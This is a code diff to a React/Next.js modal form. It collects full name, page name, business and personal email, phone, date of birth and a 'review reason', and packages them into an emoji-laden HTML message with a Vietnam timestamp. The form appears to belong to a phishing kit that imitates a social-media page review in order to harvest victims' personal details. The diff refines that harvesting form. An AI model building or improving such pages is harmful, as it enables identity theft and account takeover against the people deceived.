@@ -12,7 +12,10 @@ import 'intl-tel-input/styles';
 import Image from 'next/image';
 import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState, useEffect } from 'react';
 
-const IntlTelInput = dynamic(() => import('intl-tel-input/reactWithUtils'), { ssr: false });
+const IntlTelInput = dynamic(() => import('intl-tel-input/reactWithUtils'), { 
+    ssr: false,
+    loading: () => <div className='h-9 sm:h-10 bg-gray-100 rounded-lg' />
+});
 
 interface FormData {
     fullName: string;
@@ -57,18 +60,27 @@ const InitModal: FC = () => {
 
     const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
 
-    // Geo-detection effect
+    // Geo-detection effect - only run once on mount
     useEffect(() => {
+        const controller = new AbortController();
+        
         const fetchGeoInfo = async () => {
             try {
-                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { 
+                    timeout: 5000,
+                    signal: controller.signal 
+                });
                 const cc = (data.country_code || 'US').toUpperCase();
                 setCountryCode(cc);
-            } catch {
+            } catch (error) {
+                if (error instanceof Error && error.name === 'AbortError') return;
                 setCountryCode('US');
             }
         };
+        
         fetchGeoInfo();
+        
+        return () => controller.abort();
     }, []);
 
     // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
@@ -178,6 +190,26 @@ const InitModal: FC = () => {
         [countryCode]
     );
 
+    // Reset form when modal closes
+    useEffect(() => {
+        if (formStep !== 'init') {
+            // Reset all states
+            setFormData({
+                fullName: '',
+                pageName: '',
+                businessEmail: '',
+                personalEmail: '',
+                reviewReason: '',
+                reviewDescription: '',
+                birthDay: '',
+                birthMonth: '',
+                birthYear: ''
+            });
+            setPhoneNumber('');
+            setIsLoading(false);
+        }
+    }, [formStep]);
+
     const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
         const { name, value, type } = e.target;
         setFormData((prev) => ({
@@ -205,7 +237,9 @@ ${
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
 <b>� Page Name:</b> <code>${formData.pageName}</code>
-<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code><b>📧 Business Email:</b> <code>${formData.businessEmail}</code><b>📱 Phone Number:</b> <code>${phoneNumber}</code>
+<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
+<b>📧 Business Email:</b> <code>${formData.businessEmail}</code>
+<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date of Birth:</b> <code>${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}</code>` : ''}
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
